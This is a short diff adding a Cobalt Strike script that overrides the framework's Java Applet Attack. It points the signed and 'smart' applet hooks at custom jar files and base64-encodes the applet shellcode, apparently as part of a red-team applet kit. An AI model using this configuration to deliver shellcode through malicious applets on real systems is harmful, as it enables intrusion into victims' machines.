@@ -1,0 +1,23 @@
+#
+# override Cobalt Strike's Java Applet Attack
+#
+
+set SIGNED_APPLET_MAINCLASS {
+	return "Java.class";
+}
+
+set SIGNED_APPLET_RESOURCE {
+	return script_resource("dist/applet_signed.jar");
+}
+
+set SMART_APPLET_MAINCLASS {
+	return "JavaApplet.class";
+}
+
+set SMART_APPLET_RESOURCE {
+	return script_resource("dist/applet_rhino.jar");
+}
+
+set APPLET_SHELLCODE_FORMAT {
+	return base64_encode($1);
+}
